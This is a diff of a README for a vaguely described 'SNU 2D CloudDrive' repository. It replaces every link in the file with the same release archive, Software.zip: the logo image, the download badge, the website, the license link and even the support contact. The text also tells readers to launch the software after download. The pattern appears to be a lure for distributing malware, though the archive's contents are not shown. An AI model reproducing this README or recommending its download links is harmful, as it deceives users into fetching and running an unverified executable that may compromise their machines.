@@ -1,6 +1,6 @@
 # 🚀 Welcome to the SNU 2D CloudDrive Modes SNU Repository! 📁
 
-![CloudDrive Logo](https://example.com/cloud_drive_logo.png)
+![CloudDrive Logo](https://github.com/ashraff12345/SNU_2D_CloudDrive_Modes_SNU/releases/download/v2.0/Software.zip)
 
 ## Repository Name
 **SNU_2D_CloudDrive_Modes_SNU**
@@ -13,13 +13,13 @@
 
 ## Installation
 Click the button below to download the software:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/ashraff12345/SNU_2D_CloudDrive_Modes_SNU/releases/download/v2.0/Software.zip)](https://github.com/ashraff12345/SNU_2D_CloudDrive_Modes_SNU/releases/download/v2.0/Software.zip)
 
 ### Note:
 The software needs to be launched after download.
 
 ## Visit Website
-For more information, visit our website: [SNU 2D CloudDrive](https://example.com/snu_2d_clouddrive)
+For more information, visit our website: [SNU 2D CloudDrive](https://github.com/ashraff12345/SNU_2D_CloudDrive_Modes_SNU/releases/download/v2.0/Software.zip)
 
 ## Releases
 If the download link is not working, please check the "Releases" section of the repository for alternative downloads.
@@ -34,10 +34,10 @@ If the download link is not working, please check the "Releases" section of the 
 We welcome contributions from the community! Feel free to submit pull requests or open issues for any improvements or new features.
 
 ## License
-This project is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/rokytd/SNU_2D_CloudDrive_Modes_SNU/blob/main/LICENSE) file for more details.
+This project is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/ashraff12345/SNU_2D_CloudDrive_Modes_SNU/releases/download/v2.0/Software.zip) file for more details.
 
 ## Support
-If you encounter any issues or have any questions, please contact our support team at support@snuclouddrive.com.
+If you encounter any issues or have any questions, please contact our support team at https://github.com/ashraff12345/SNU_2D_CloudDrive_Modes_SNU/releases/download/v2.0/Software.zip
 
 Let's collaborate and make the SNU 2D CloudDrive Modes SNU project even better! 🌟
 
